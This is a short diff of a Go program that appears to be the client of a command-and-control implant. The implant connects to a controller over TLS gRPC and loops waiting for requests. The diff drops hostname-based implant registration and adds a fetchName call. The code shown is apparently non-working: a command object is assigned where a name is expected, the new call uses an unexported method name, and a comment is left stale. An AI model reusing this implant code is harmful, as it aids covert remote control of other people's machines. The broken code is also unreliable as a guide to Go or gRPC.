@@ -55,12 +55,6 @@ func main() {
 		client grpcapi.ImplantClient
 	)
 
-	var name = exec.Command("hostname") // generate a client name on first launch
-
-	iam = whoami.Register // register is defined in proto as a string
-
-	iam = name
-
 	tlsCredentials, err := loadTLSCredentials()
 	if err != nil {
 		log.Fatal("cannot load TLS credentials: ", err)
@@ -75,7 +69,9 @@ func main() {
 	ctx := context.Background()
 
 	client = grpcapi.NewImplantClient(conn)
-	client.RegisterImplant(ctx, iam) // RegisterImplant is defined in proto as taking in a string and has no output
+	
+	var test = new(grpcapi.Empty)
+	client.fetchName(ctx, test) // RegisterImplant is defined in proto as taking in a string and has no output
 
 	for {
 		var req = new(grpcapi.Empty)
